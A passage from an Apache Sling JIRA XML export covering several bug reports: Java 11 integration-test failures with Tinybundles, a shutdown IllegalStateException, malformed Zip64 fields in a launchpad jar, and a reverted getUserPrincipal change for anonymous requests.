&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedHeader panelHeader&quot; style=&quot;border-bottom-width: 1px;&quot;&gt;&lt;b&gt;manifest of BuildByTinyBundles5ef75f77-5f6a-4470-9801-53e7e0f77603_0.jar&lt;/b&gt;&lt;/div&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;[...]
Require-Capability: osgi.extender;filter:=&quot;(&amp;amp;(osgi.extender=osgi.compo
 nent)(version&amp;gt;=1.3.0)(!(version&amp;gt;=2.0.0)))&quot;,osgi.ee;filter:=&quot;(osgi.ee=
 UNKNOWN)&quot;
Service-Component: OSGI-INF/org.apache.sling.servlets.resolver.it.Test
 ResourceProvider.xml,OSGI-INF/org.apache.sling.servlets.resolver.it.T
 estServiceUserValidator.xml
TinybundlesVersion: pax-tinybundles-3.0.0
Tool: Bnd-3.5.0.201709291849
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I narrowed this down to the upgrade from bundle parent 49 to 50, and it is caused by the bump of the minimal java version to 11 (&lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-11979&quot; title=&quot;update servlets-resolver to parent 52&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-11979&quot;&gt;&lt;del&gt;SLING-11979&lt;/del&gt;&lt;/a&gt;).&lt;/p&gt;

&lt;p&gt;Because if I don&apos;t run with my java 11 default, but with&lt;/p&gt;
&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;JAVA_HOME=/usr/lib64/jvm/java-1.8.0-openjdk-1.8.0/jre mvn clean install -Dsling.java.version=8
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;the build runs fine (with parent 50).&lt;/p&gt;



&lt;p&gt;&#160;&lt;/p&gt;</description>
                <environment></environment>
        <key id="13544451">SLING-11981</key>
            <summary>Java 11 causes ITs with Tinybundles 3.0.0 to fail</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="1" iconUrl="https://issues.apache.org/jira/images/icons/statuses/open.png" description="The issue is open and ready for the assignee to start work on it.">Open</status>
                    <statusCategory id="2" key="new" colorName="blue-gray"/>
                                    <resolution id="-1">Unresolved</resolution>
                                        <assignee username="joerghoh">Joerg Hoh</assignee>
                                    <reporter username="joerghoh">Joerg Hoh</reporter>
                        <labels>
                    </labels>
                <created>Fri, 21 Jul 2023 14:20:33 +0000</created>
                <updated>Fri, 20 Dec 2024 21:47:37 +0000</updated>
                                                                                <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                                                                                <comments>
                            <comment id="17745697" author="olli" created="Fri, 21 Jul 2023 18:55:15 +0000"  >&lt;p&gt;Requires a new Tinybundles release.&lt;/p&gt;</comment>
                            <comment id="17907503" author="olli" created="Fri, 20 Dec 2024 21:47:37 +0000"  >&lt;p&gt;It&apos;s not Java 11 alone, because we have other bundles like &lt;tt&gt;org.apache.sling.jcr.contentloader&lt;/tt&gt;&#160;which use TinyBundles 3.0.0 and build without issues on Java 11 and with &lt;tt&gt;sling.java.version&lt;/tt&gt; set to 11.&lt;/p&gt;

&lt;p&gt;TinyBundles 4.0.0 is available and will be part of Testing PaxExam 5.&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="10032">
                    <name>Blocker</name>
                                            <outwardlinks description="blocks">
                                        <issuelink>
            <issuekey id="13544438">SLING-11979</issuekey>
        </issuelink>
                            </outwardlinks>
                                                        </issuelinktype>
                            <issuelinktype id="12310560">
                    <name>Problem/Incident</name>
                                            <outwardlinks description="causes">
                                        <issuelink>
            <issuekey id="13546409">SLING-11996</issuekey>
        </issuelink>
                            </outwardlinks>
                                                        </issuelinktype>
                            <issuelinktype id="10030">
                    <name>Reference</name>
                                            <outwardlinks description="relates to">
                                        <issuelink>
            <issuekey id="13602269">SLING-12576</issuekey>
        </issuelink>
                            </outwardlinks>
                                                        </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            43 weeks, 5 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1jaw8:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11978] IllegalStateException on shutdown</title>
                <link>https://issues.apache.org/jira/browse/SLING-11978</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;The whiteboard might throw an IllegalStateException on shutdown:&lt;/p&gt;
&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;21.07.2023 13:47:26.599 *ERROR* [FelixLogListener] org.apache.sling.resourcemerger.impl.MergedResourcePickerWhiteboard bundle org.apache.sling.resourcemerger:1.4.2 (567)[org.apache.sling.resourcemerger.impl.MergedResourcePickerWhiteboard(3441)] : The unbindMergedResourcePicker2 method has thrown an exception (java.lang.IllegalStateException: Service already unregistered.)
java.lang.IllegalStateException: Service already unregistered.
        at org.apache.felix.framework.ServiceRegistrationImpl.unregister(ServiceRegistrationImpl.java:142)
        at org.apache.sling.resourcemerger.impl.MergedResourcePickerWhiteboard.unregisterMergingResourceProvider(MergedResourcePickerWhiteboard.java:110) [org.apache.sling.resourcemerger:1.4.2]
        at org.apache.sling.resourcemerger.impl.MergedResourcePickerWhiteboard.unbindMergedResourcePicker2(MergedResourcePickerWhiteboard.java:81) [org.apache.sling.resourcemerger:1.4.2]
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;</description>
                <environment></environment>
        <key id="13544434">SLING-11978</key>
            <summary>IllegalStateException on shutdown</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="cziegeler">Carsten Ziegeler</assignee>
                                    <reporter username="cziegeler">Carsten Ziegeler</reporter>
                        <labels>
                    </labels>
                <created>Fri, 21 Jul 2023 12:01:52 +0000</created>
                <updated>Mon, 31 Jul 2023 11:02:45 +0000</updated>
                            <resolved>Fri, 21 Jul 2023 12:14:16 +0000</resolved>
                                    <version>Resource Merger 1.4.2</version>
                                    <fixVersion>Resource Merger 1.4.4</fixVersion>
                                    <component>ResourceResolver</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                <comments>
                            <comment id="17745566" author="cziegeler" created="Fri, 21 Jul 2023 12:14:16 +0000"  >&lt;p&gt;&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-resourcemerger/commit/c19bd557f3aaa7ead8b4ccf7c71b12b3288b7e3d&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-resourcemerger/commit/c19bd557f3aaa7ead8b4ccf7c71b12b3288b7e3d&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 13 weeks, 5 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1jasg:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11975] org.apache.sling.launchpad.base.jar fails to load on jdk 11.0.20 because it has malformed Zip64 extra fields</title>
                <link>https://issues.apache.org/jira/browse/SLING-11975</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;I ran into an error when trying to run AEM quickstart locally after upgrading my jdk to 11.0.20 (&lt;a href=&quot;https://www.oracle.com/java/technologies/javase/11-0-20-relnotes.html&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;release notes&lt;/a&gt;):&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;core-libs/java.util.jar&lt;br/&gt;
&lt;b&gt;&lt;a href=&quot;https://www.oracle.com/java/technologies/javase/11-0-20-relnotes.html#JDK-8302483&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;&#10140;&lt;/a&gt;&lt;/b&gt;&#160;&lt;b&gt;Improved ZIP64 Extra Field Validation&lt;/b&gt;&#160;(JDK-8302483 (not public))&lt;tt&gt;java.util.zip.ZipFile&lt;/tt&gt;&#160;has been updated to provide additional validation of ZIP64 extra fields when opening a ZIP file. This validation may be disabled by setting the system property&#160;&lt;tt&gt;jdk.util.zip.disableZip64ExtraFieldValidation&lt;/tt&gt;&#160;to&#160;&lt;tt&gt;true&lt;/tt&gt;.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;it manifested for me as an exception in &lt;tt&gt;logs/stderr.log&lt;/tt&gt;&#160;:&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
20.07.2023 07:59:22.568 *ERROR* [main] Cannot launch: Cannot install jar:file:/opt/code/aem/quickstart/target/author-54594/crx-quickstart/app/cq-quickstart-6.6.0-SNAPSHOT-standalone-quickstart.jar!/resources/org.apache.sling.launchpad.base.jar &lt;span class=&quot;code-keyword&quot;&gt;for&lt;/span&gt; use
20.07.2023 07:59:22.568 *ERROR* [main] java.util.zip.ZipException: Invalid CEN header (invalid zip64 extra data field size)
20.07.2023 07:59:22.568 *ERROR* [main]  at java.base/java.util.zip.ZipFile$Source.zerror(ZipFile.java:1736)
20.07.2023 07:59:22.568 *ERROR* [main]  at java.base/java.util.zip.ZipFile$Source.checkExtraFields(ZipFile.java:1254)
20.07.2023 07:59:22.568 *ERROR* [main]  at java.base/java.util.zip.ZipFile$Source.initCEN(ZipFile.java:1701)
20.07.2023 07:59:22.568 *ERROR* [main]  at java.base/java.util.zip.ZipFile$Source.&amp;lt;init&amp;gt;(ZipFile.java:1430)
20.07.2023 07:59:22.568 *ERROR* [main]  at java.base/java.util.zip.ZipFile$Source.get(ZipFile.java:1393)
20.07.2023 07:59:22.568 *ERROR* [main]  at java.base/java.util.zip.ZipFile$CleanableResource.&amp;lt;init&amp;gt;(ZipFile.java:742)
20.07.2023 07:59:22.568 *ERROR* [main]  at java.base/java.util.zip.ZipFile$CleanableResource.get(ZipFile.java:859)
20.07.2023 07:59:22.568 *ERROR* [main]  at java.base/java.util.zip.ZipFile.&amp;lt;init&amp;gt;(ZipFile.java:257)
20.07.2023 07:59:22.568 *ERROR* [main]  at java.base/java.util.zip.ZipFile.&amp;lt;init&amp;gt;(ZipFile.java:186)
20.07.2023 07:59:22.568 *ERROR* [main]  at java.base/java.util.jar.JarFile.&amp;lt;init&amp;gt;(JarFile.java:348)
20.07.2023 07:59:22.568 *ERROR* [main]  at java.base/java.util.jar.JarFile.&amp;lt;init&amp;gt;(JarFile.java:319)
20.07.2023 07:59:22.568 *ERROR* [main]  at java.base/java.util.jar.JarFile.&amp;lt;init&amp;gt;(JarFile.java:285)
20.07.2023 07:59:22.568 *ERROR* [main]  at org.apache.sling.commons.osgi.bundleversion.FileBundleVersionInfo.&amp;lt;init&amp;gt;(FileBundleVersionInfo.java:40)
20.07.2023 07:59:22.568 *ERROR* [main]  at org.apache.sling.launchpad.base.shared.Loader.installLauncherJar(Loader.java:172)
20.07.2023 07:59:22.568 *ERROR* [main]  at org.apache.sling.launchpad.app.Main.doStart(Main.java:382)
20.07.2023 07:59:22.568 *ERROR* [main]  at org.apache.sling.launchpad.app.Main.doStart(Main.java:347)
20.07.2023 07:59:22.568 *ERROR* [main]  at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
20.07.2023 07:59:22.568 *ERROR* [main]  at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
20.07.2023 07:59:22.568 *ERROR* [main]  at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
20.07.2023 07:59:22.568 *ERROR* [main]  at java.base/java.lang.reflect.Method.invoke(Method.java:566)
20.07.2023 07:59:22.568 *ERROR* [main]  at com.adobe.granite.quickstart.base.impl.exec.Bootstrap.run(Bootstrap.java:107)
20.07.2023 07:59:22.568 *ERROR* [main]  at com.adobe.granite.quickstart.base.impl.Quickstart.run(Quickstart.java:272)
20.07.2023 07:59:22.568 *ERROR* [main]  at com.adobe.granite.quickstart.base.impl.Main.&amp;lt;init&amp;gt;(Main.java:918)
20.07.2023 07:59:22.568 *ERROR* [main]  at com.adobe.granite.quickstart.base.impl.Main.main(Main.java:980)
MAIN process: shutdown hook
MAIN process: exiting &lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;This appears to be an issue with the org.apache.sling.launchpad.base 7.0.3-2.7.6 jar specifically:&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
$ jar -tf ~/.m2/repository/org/apache/sling/org.apache.sling.launchpad.base/7.0.3-2.7.6/org.apache.sling.launchpad.base-7.0.3-2.7.6.jar
java.util.zip.ZipException: Invalid CEN header (invalid zip64 extra data field size)
	at java.base/java.util.zip.ZipFile$Source.zerror(ZipFile.java:1736)
	at java.base/java.util.zip.ZipFile$Source.checkExtraFields(ZipFile.java:1254)
	at java.base/java.util.zip.ZipFile$Source.initCEN(ZipFile.java:1701)
	at java.base/java.util.zip.ZipFile$Source.&amp;lt;init&amp;gt;(ZipFile.java:1430)
	at java.base/java.util.zip.ZipFile$Source.get(ZipFile.java:1393)
	at java.base/java.util.zip.ZipFile$CleanableResource.&amp;lt;init&amp;gt;(ZipFile.java:742)
	at java.base/java.util.zip.ZipFile$CleanableResource.get(ZipFile.java:859)
	at java.base/java.util.zip.ZipFile.&amp;lt;init&amp;gt;(ZipFile.java:257)
	at java.base/java.util.zip.ZipFile.&amp;lt;init&amp;gt;(ZipFile.java:186)
	at java.base/java.util.zip.ZipFile.&amp;lt;init&amp;gt;(ZipFile.java:157)
	at jdk.jartool/sun.tools.jar.Main.list(Main.java:1499)
	at jdk.jartool/sun.tools.jar.Main.run(Main.java:380)
	at jdk.jartool/sun.tools.jar.Main.main(Main.java:1680) &lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The issue is that it was created with Bnd 5.1.1 (according to the jar manifest), and the Bnd&#8217;s treatment of extra fields was corrected in 5.3 &lt;a href=&quot;https://github.com/bndtools/bnd/issues/4507#issuecomment-771925051&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/bndtools/bnd/issues/4507#issuecomment-771925051&lt;/a&gt;&lt;br/&gt;
&#160;I believe a new version of org.apache.sling.launchpad.base should be released after upgrading maven-bundle-plugin to at least 5.1.5 (&lt;a href=&quot;https://github.com/apache/felix-dev/commit/b29ea9a5d6dc8662dc0c960eff199c18fcd6b5e4&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;based on its bndlib dependency being upgraded to 6.20&lt;/a&gt;).&lt;/p&gt;</description>
                <environment></environment>
        <key id="13544343">SLING-11975</key>
            <summary>org.apache.sling.launchpad.base.jar fails to load on jdk 11.0.20 because it has malformed Zip64 extra fields</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="2" iconUrl="https://issues.apache.org/jira/images/icons/priorities/critical.svg">Critical</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="madamcin">Mark Adamcin</assignee>
                                    <reporter username="madamcin">Mark Adamcin</reporter>
                        <labels>
                            <label>has-pr</label>
                    </labels>
                <created>Thu, 20 Jul 2023 21:13:36 +0000</created>
                <updated>Mon, 24 Jul 2023 18:18:17 +0000</updated>
                            <resolved>Fri, 21 Jul 2023 13:43:42 +0000</resolved>
                                    <version>Launchpad Base 2.7.2</version>
                    <version>Launchpad Base 2.7.4</version>
                    <version>Launchpad Base 2.7.6</version>
                                    <fixVersion>Launchpad Base 2.7.8</fixVersion>
                                    <component>Launchpad</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>3</watches>
                                                                                                                <comments>
                            <comment id="17745285" author="madamcin" created="Thu, 20 Jul 2023 21:51:49 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=rombert&quot; class=&quot;user-hover&quot; rel=&quot;rombert&quot;&gt;rombert&lt;/a&gt; &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=cziegeler&quot; class=&quot;user-hover&quot; rel=&quot;cziegeler&quot;&gt;cziegeler&lt;/a&gt; Would one of you be able to review this?&#160;&lt;/p&gt;</comment>
                            <comment id="17745458" author="cziegeler" created="Fri, 21 Jul 2023 07:16:29 +0000"  >&lt;p&gt;jdk to 11.0.20  is currently not available for my system&lt;/p&gt;</comment>
                            <comment id="17745604" author="rombert" created="Fri, 21 Jul 2023 13:43:42 +0000"  >&lt;p&gt;PR merged, thanks &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=madamcin&quot; class=&quot;user-hover&quot; rel=&quot;madamcin&quot;&gt;madamcin&lt;/a&gt; for the contribution.&lt;/p&gt;</comment>
                            <comment id="17746581" author="madamcin" created="Mon, 24 Jul 2023 18:18:17 +0000"  >&lt;p&gt;For future reference, I narrowed down the affected artifact versions to just the three listed. Using zipinfo, it looks like the malformed entries are the ones embedded from org.apache.felix.framework. If the upstream zip entries defined a zip64 extra field like a last modified timestamp, the resulting embedded entry had a malformed zip64 extra field.&lt;/p&gt;
&lt;ul&gt;
	&lt;li&gt;7.0.1-2.7.2&lt;/li&gt;
	&lt;li&gt;7.0.1-2.7.4&lt;/li&gt;
	&lt;li&gt;7.0.3-2.7.6&lt;/li&gt;
&lt;/ul&gt;
</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 13 weeks, 2 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1ja88:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11974] Regression caused by SLING-11825 - change in request getUserPrincipal</title>
                <link>https://issues.apache.org/jira/browse/SLING-11974</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;With &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-11825&quot; title=&quot;SlingHttpServletRequestImpl.getUserPrincipal() does not return null for anonymous requests&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-11825&quot;&gt;&lt;del&gt;SLING-11825&lt;/del&gt;&lt;/a&gt; getUserPrincipal will always return null for the anonymous user. While this change is spec compliant it is a change in behaviour which is actually breaking users of Sling.&lt;br/&gt;
Therefore we should revert that change and add a switch to toggle the behaviour. By default, the switch will be set to enable the old, non spec compliant behaviour.&lt;br/&gt;
In general, it is suggest to use request getAuthType() == null to check whether the request is authenticated - and only if that returns a non null value call getUserPrincipal&lt;/p&gt;</description>
                <environment></environment>
        <key id="13544268">SLING-11974</key>
            <summary>Regression caused by SLING-11825 - change in request getUserPrincipal</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="cziegeler">Carsten Ziegeler</assignee>
                                    <reporter username="cziegeler">Carsten Ziegeler</reporter>
                        <labels>
                    </labels>
                <created>Thu, 20 Jul 2023 09:30:05 +0000</created>
                <updated>Thu, 13 Jun 2024 19:26:36 +0000</updated>
                            <resolved>Thu, 20 Jul 2023 09:39:24 +0000</resolved>
                                    <version>Engine 2.14.0</version>
                    <version>Engine 2.15.0</version>
                    <version>Engine 2.15.2</version>
                                    <fixVersion>Engine 2.15.4</fixVersion>
                    <fixVersion>API 2.27.6</fixVersion>
                                    <component>Engine</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>3</watches>
                                                                                                                <comments>
                            <comment id="17744995" author="cziegeler" created="Thu, 20 Jul 2023 09:39:24 +0000"  >&lt;p&gt;Reverted in &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-engine/commit/5bab842140364f2703094548a9912d28339f32b5&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-engine/commit/5bab842140364f2703094548a9912d28339f32b5&lt;/a&gt;&lt;/p&gt;</comment>
                            <comment id="17745012" author="kwin" created="Thu, 20 Jul 2023 10:16:53 +0000"  >&lt;p&gt;What exactly is breaking? How to determine if user is logged in or not then in Sling?&lt;/p&gt;</comment>
                            <comment id="17745013" author="cziegeler" created="Thu, 20 Jul 2023 10:19:55 +0000"  >&lt;p&gt;There are Sling users expecting that getUserPrincipals returns something, even in case of anonymous&lt;br/&gt;
The way that we document for a long time to check for anonymous requests is request getRemoteUser()&lt;/p&gt;</comment>
                            <comment id="17745019" author="kwin" created="Thu, 20 Jul 2023 10:29:39 +0000"  >&lt;p&gt;Who is &quot;we&quot; and where is that documented?&lt;/p&gt;</comment>
                            <comment id="17745027" author="cziegeler" created="Thu, 20 Jul 2023 10:40:46 +0000"  >&lt;p&gt;Sling&apos;s code  has many examples where getRemoteUser is used to check for null for anonymous access; authentication core has code to make sure it is not set in this case. getAuthType can be used as well to check&lt;br/&gt;
So we have mechanisms in place for years to check for the anonymous user reliably. &lt;/p&gt;</comment>
                            <comment id="17745071" author="cziegeler" created="Thu, 20 Jul 2023 12:32:41 +0000"  >&lt;p&gt;Our docs mention getAuthType() : &lt;a href=&quot;https://sling.apache.org/documentation/the-sling-engine/authentication/authentication-actors.html&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://sling.apache.org/documentation/the-sling-engine/authentication/authentication-actors.html&lt;/a&gt;&lt;/p&gt;</comment>
                            <comment id="17745150" author="cziegeler" created="Thu, 20 Jul 2023 16:04:00 +0000"  >&lt;p&gt;Updated javadocs &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-api/commit/b76ab7e07c79dab4cd89eb25784848c2f5ad2732&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-api/commit/b76ab7e07c79dab4cd89eb25784848c2f5ad2732&lt;/a&gt;&lt;/p&gt;</comment>
